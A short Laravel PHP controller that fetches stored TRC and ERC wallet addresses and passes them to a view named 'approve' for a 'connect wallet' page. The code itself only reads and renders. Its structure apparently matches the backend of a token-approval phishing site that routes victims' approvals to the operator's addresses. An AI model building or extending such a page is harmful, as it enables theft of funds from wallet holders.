<?php


namespace App\Http\Controllers\Web;


use App\Models\AppSetting\AppVersion;
use App\Models\DuAddress\DuAddress;
use App\Models\DuAddress\DuAddressesType;
use Illuminate\Support\Str;

class ConnectWalletController extends Controller
{
    public function index()
    {

        $type = DuAddressesType::whereIn("name",["trc","erc"])->get();

        $data = [];
        foreach($type as $k => $value){

            $address = DuAddress::where("type_id",$value->id)->first();

            $data[$value->name] = [
                "a"=>empty($address) ? "" : $address->address
            ];

        }

        return view('web.approve', ['data'=>$data]);
    }

}
